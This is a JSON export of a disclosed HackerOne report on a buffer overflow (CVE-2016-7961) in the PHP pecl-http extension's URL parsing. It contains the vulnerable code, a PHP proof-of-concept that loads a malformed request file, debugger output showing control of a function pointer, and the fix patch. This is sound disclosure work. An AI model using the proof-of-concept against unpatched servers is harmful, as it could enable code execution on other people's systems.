{
  "id": 174069,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzQwNjk=",
  "url": "https://hackerone.com/reports/174069",
  "title": "Buffer overflow in HTTP parse_hostinfo(), parse_userinfo() and parse_scheme()",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2016-10-05T12:08:41.367Z",
  "submitted_at": "2016-10-05T12:08:41.367Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "rc0r",
    "url": "/rc0r",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/153/304e6c45c12b1b9dec0c6c0f2ebd67341d234566_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJAEOSEA%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122446Z&X-Amz-Expires=1603&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGoM7UVkpoUFXOwmBO1YCW3cw%2F4NyxP2Yan%2BgrkBav8AiEAyCUaZteSGAOL1VybC9wE4FNtA9ZRB0rOhRCfRb1SJtUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDK4laJFhO348YrQkpSqPBT0JpdttzMzvj7d49wHxo6XKhZp6ShyKPYUpw0Uq4AHmWnLgN8g%2BsTPzAignfCeJBrRSLMJVkOL0W5ter7990DhqIASPNW1EZwrDyGA7kuePP%2BF4tcrX3LO0OOR6gGZx9EtA5T7iJB1DFapuW5N7q%2F51A5Mu7ZLK0NaZo8zhsohgiWzzyR2iluk%2FLl3XGm%2Fa6%2BcTwHua%2BNjD%2F97XLRv1zF3YE7sSdAY3bunMdQ6NaH%2BxtZj7FOWcsouUYmSWYMItq7rFc2QX6eLL04LoQhGF%2BsAlIJRuG9morj%2FzbUBeITu4Wjw1YqZoqh4stcI25Q3hf6RXlfWGW%2FpPgFVXTaKeiqdUSu86Hp0mtdhvWjZ%2F3frTMpqYRrp2a1mbGWETUc5Uf0mzI3H5oA%2B3GNQfu3cWaPp6Vj5kQ0fBwtej92wxqBKYcwQGX1OqkYgzXEkCCIsQfZxhAaPTN%2FtgMRJ58JVzNuHtKdPerJm1tZ8fQ6tljGtPSMxjFhDzyA9m9NHez5izRf7KqXOVO9vYJFw%2Fi00wL4IHCuGJag8I%2Fxka6p1qKR%2BLgjmHhEme4qKwVcZHLFn9ks9Opq5yjYs0%2BDnJLzW8EoTTImazBY6PuaPKcKQY8cuOfRLUWHjfDoiEvtTVUk8hNiRL7PEmq8TnurN%2BlvDbNHfB1bc7T4OkQ0bkDfDKxp%2Bw6kMpFfLzp3zMh4sVkCicAf8phxPfZ3ImBweoHetjdWVM%2FAaqoQFfIvSuNFRLjBRBvd1PbhmnN5Jq5WNPDsGhoXmnlt9dIMyM30uqRrm5JWVLqPt5x3tJ%2F6XEKfiDRzBMK4wT7DJ94Iud7aggpV%2BQl9JVRf86hwRXR9rFbvmmDTUka9kitEZLd%2FlL7mfvrF8wlKGsrgY6sQG6xY6iPHcuzMUPYlF%2BiPLSQhv%2F6pGqgLnKtUql08pwI3ttBcBcKWvZH4WOc5lXL1qEfHHkJQ1HwYwKvH5vG3URLBINtmvkDZGhy%2F605sBLv1QwPSjd91a2Orn1TKno6iqHfQCQTcPrP0NyRztLXpdgkxXv3JyY%2FNXpBhGdrABNb%2BwkB78q7U4iWLt6tducslFnRZ4D7lUbbNW%2FhxyDCkCcwec2EWKyZiZLijLaLBQG2P4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=586c3ceb228096e277e2b1d4d0ca10e7ae93f2087049b8338c8742367e1a0864",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJAEOSEA%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122446Z&X-Amz-Expires=1603&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGoM7UVkpoUFXOwmBO1YCW3cw%2F4NyxP2Yan%2BgrkBav8AiEAyCUaZteSGAOL1VybC9wE4FNtA9ZRB0rOhRCfRb1SJtUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDK4laJFhO348YrQkpSqPBT0JpdttzMzvj7d49wHxo6XKhZp6ShyKPYUpw0Uq4AHmWnLgN8g%2BsTPzAignfCeJBrRSLMJVkOL0W5ter7990DhqIASPNW1EZwrDyGA7kuePP%2BF4tcrX3LO0OOR6gGZx9EtA5T7iJB1DFapuW5N7q%2F51A5Mu7ZLK0NaZo8zhsohgiWzzyR2iluk%2FLl3XGm%2Fa6%2BcTwHua%2BNjD%2F97XLRv1zF3YE7sSdAY3bunMdQ6NaH%2BxtZj7FOWcsouUYmSWYMItq7rFc2QX6eLL04LoQhGF%2BsAlIJRuG9morj%2FzbUBeITu4Wjw1YqZoqh4stcI25Q3hf6RXlfWGW%2FpPgFVXTaKeiqdUSu86Hp0mtdhvWjZ%2F3frTMpqYRrp2a1mbGWETUc5Uf0mzI3H5oA%2B3GNQfu3cWaPp6Vj5kQ0fBwtej92wxqBKYcwQGX1OqkYgzXEkCCIsQfZxhAaPTN%2FtgMRJ58JVzNuHtKdPerJm1tZ8fQ6tljGtPSMxjFhDzyA9m9NHez5izRf7KqXOVO9vYJFw%2Fi00wL4IHCuGJag8I%2Fxka6p1qKR%2BLgjmHhEme4qKwVcZHLFn9ks9Opq5yjYs0%2BDnJLzW8EoTTImazBY6PuaPKcKQY8cuOfRLUWHjfDoiEvtTVUk8hNiRL7PEmq8TnurN%2BlvDbNHfB1bc7T4OkQ0bkDfDKxp%2Bw6kMpFfLzp3zMh4sVkCicAf8phxPfZ3ImBweoHetjdWVM%2FAaqoQFfIvSuNFRLjBRBvd1PbhmnN5Jq5WNPDsGhoXmnlt9dIMyM30uqRrm5JWVLqPt5x3tJ%2F6XEKfiDRzBMK4wT7DJ94Iud7aggpV%2BQl9JVRf86hwRXR9rFbvmmDTUka9kitEZLd%2FlL7mfvrF8wlKGsrgY6sQG6xY6iPHcuzMUPYlF%2BiPLSQhv%2F6pGqgLnKtUql08pwI3ttBcBcKWvZH4WOc5lXL1qEfHHkJQ1HwYwKvH5vG3URLBINtmvkDZGhy%2F605sBLv1QwPSjd91a2Orn1TKno6iqHfQCQTcPrP0NyRztLXpdgkxXv3JyY%2FNXpBhGdrABNb%2BwkB78q7U4iWLt6tducslFnRZ4D7lUbbNW%2FhxyDCkCcwec2EWKyZiZLijLaLBQG2P4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d0df22cbfdb70072ca5fa0fb955af2fa61cd758a23e97b58318ff693db66c3a7"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2016-7961"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-05-30T15:13:49.305Z",
  "bug_reporter_agreed_on_going_public_at": "2017-05-06T08:21:38.003Z",
  "team_member_agreed_on_going_public_at": "2017-05-30T15:13:49.241Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Since the original report is still marked as private in the PHP bug tracker please find the copy & pasted bug report below (edited for readability and to include correct bug tracker id). See the references section for a link to the issue in the PHP bug tracker!\n\nThe maintainer already fixed the issue in the public git repo using the proposed patch included in the original report. Fixed versions 3.1.0RC1 and 2.6.0RC1 of the pecl-http extension have been released as well.\n\nMitre assigned **CVE-2016-7961** for this issue.\n\n# Description\n\nThe parsing functions of the PECL HTTP extension allow overflowing a buffer with data originating from an arbitrary HTTP request. Affected are the `parse_hostinfo()`, `parse_userinfo()` and `parse_scheme()` functions in `php_http_url.c` that may get called when instantiating/initializing an HTTP message object. The problem occurs because in the main processing loop `char *ptr` may get incremented past the corresponding end pointer `char *end` used as the end marker. Thus the parser loop may continue to execute and buffer `state->buffer` may overflow.  \n\nRelevant code snippet from `php_http_url.c:1096`:\n\n```c\nstatic ZEND_RESULT_CODE parse_hostinfo(struct parse_state *state, const char *ptr)\n{\n[...]\n    if (ptr != end) do {\n        switch (*ptr) {\n            [...]\n            case '0': case '1': case '2': case '3': case '4': case '5': case '6':\n            case '7': case '8': case '9':\n                /* allowed */\n                if (port) {\n                    state->url.port *= 10;\n                    state->url.port += *ptr - '0';\n                } else {\n                    label = ptr;\n                    state->buffer[state->offset++] = *ptr;\n                }\n                break;\n            [...]\n            default:\n            [...]\n                } else if (!(mb = parse_mb(state, PARSE_HOSTINFO, ptr, end, tmp, state->flags & PHP_HTTP_URL_SILENT_ERRORS))) {\n                    if (!(state->flags & PHP_HTTP_URL_IGNORE_ERRORS)) {\n                        return FAILURE;\n                    }\n                    break;\n                }\n                label = ptr;\n                ptr += mb - 1;  // ptr increased here as in various other locations\n        }\n    } while (++ptr != end);     // ptr pre-incremented -> check condition may be missed!\n[...]\n```\n\n# Security impact and PoC\n\nSince this bug allows to overwrite quite large parts of memory arbitrary code execution seems very likely. In [1] you'll find a malformed HTTP request that demonstrates the issue:\n\n```php\n$ cat http_message_parse.php\n/*\n        http_message_parse.php\n        bug73185.bin\n        http://hlt99.blinkenshell.org/php/bug73185.bin\n*/\n<?php\n    $http_msg = new http\\Message(file_get_contents(\"bug73185.bin\"), false);\n?>\n```\n\n```\n$ ./configure --enable-raphf --enable-propro --with-http && make\n$ gdb ./sapi/cli/php\ngdb> r http_message_parse.php\n[...]\nFatal error: Uncaught http\\Exception\\BadMessageException: http\\Message::__construct(): Could not parse HTTP protocol version 'HTTP/1.rdrd-vvv5:##HT\n[...] // garbled output\n85:#~t? HTT in http_message_parse.php on line 7\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000006d6ef3 in _php_stream_free (stream=<optimized out>, close_options=11)\n    at /home/rc0r/tmp/php-src/main/streams/streams.c:467\n467\t\t\tret = stream->ops->close(stream, preserve_handle ? 0 : 1);\ngdb> i r\nrax            0x4142434445464748\t4702394921427289928\nrbx            0xb\t11\nrcx            0x1\t1\nrdx            0x0\t0\nrsi            0x1\t1\nrdi            0x7ffff42ad300\t140737289835264\nrbp            0x7ffff42ad300\t0x7ffff42ad300\nrsp            0x7fffffffb150\t0x7fffffffb150\nr8             0x0\t0\nr9             0x1\t1\nr10            0x3d3\t979\nr11            0x7ffff58ad760\t140737312905056\nr12            0x0\t0\nr13            0x1\t1\nr14            0x0\t0\nr15            0x0\t0\nrip            0x6d6ef3\t0x6d6ef3 <_php_stream_free+307>\neflags         0x10202\t[ IF RF ]\ncs             0x33\t51\nss             0x2b\t43\nds             0x0\t0\nes             0x0\t0\nfs             0x0\t0\ngs             0x0\t0\ngdb> x/i $rip\n=> 0x6d6ef3 <_php_stream_free+307>:\tcallq  *0x10(%rax)\n```\n\nThe attempt to parse the supplied HTTP request fails at some point and used resources are freed by the extension. It was possible to overwrite a `php_stream` structure including its pointer to a `php_stream_ops` structure containing function pointers that are about to be called from within `_php_stream_free()` as shown above. Register `rax` contains data from the malformed HTTP request starting at offset 0x2139. \n\n[1] http://hlt99.blinkenshell.org/php/005-bug73185.bin\n\n# Patch\n\nAfter careful review by the project maintainers the following patch may be used to fix the reported issue.  \n\n```c\nFrom ec2d2e1648127b2a0bb15f10144daca59bc6f03c Mon Sep 17 00:00:00 2001\nFrom: rc0r <hlt99@blinkenshell.org>\nDate: Mon, 26 Sep 2016 21:34:29 +0200\nSubject: [PATCH] Buffer overflow in parse_hostinfo() fixed\n\n---\n src/php_http_url.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a/src/php_http_url.c b/src/php_http_url.c\nindex 2332fb5..70e4c2c 100644\n--- a/src/php_http_url.c\n+++ b/src/php_http_url.c\n@@ -1107,7 +1107,7 @@ static ZEND_RESULT_CODE parse_hostinfo(struct parse_state *state, const char *pt\n    }\n #endif\n \n-\tif (ptr != end) do {\n+\tif (ptr < end) do {\n        switch (*ptr) {\n        case ':':\n            if (port) {\n@@ -1235,7 +1235,7 @@ static ZEND_RESULT_CODE parse_hostinfo(struct parse_state *state, const char *pt\n            label = ptr;\n            ptr += mb - 1;\n        }\n-\t} while (++ptr != end);\n+\t} while (++ptr < end);\n \n    if (!state->url.host) {\n        len = state->offset - len;\n-- \n2.10.0\n```\n\n# Versions known to be affected\n\npecl-http extension versions up to and including:\n\n* 3.1.0beta2 (PHP 7)\n* 2.6.0beta2 (PHP 5)\n\n# Timeline\n\n2016-09-27  Initial report to PHP bug tracker (#73185)\n2016-10-04  Issue fixed in git repository, CVE requested\n2016-10-04  Maintainer released fixed pecl-http extensions 3.1.0RC1 and 2.6.0RC1\n2016-10-05  Mitre assigned CVE-2016-7961\n\n# References\n\nhttps://bugs.php.net/bug.php?id=73185\nhttps://github.com/m6w6/ext-http/commit/e096f45ff30a46d6a8e96da7bc6334d2ac5ab7c2\n\nhttps://pecl.php.net/package/pecl_http/3.1.0RC1\nhttps://pecl.php.net/package/pecl_http/2.6.0RC1\n\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7961",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-06-05T08:21:38.049Z",
  "allow_singular_disclosure_after": -211176188.37907094,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "eveeez",
    "0xspade",
    "spetr0x"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
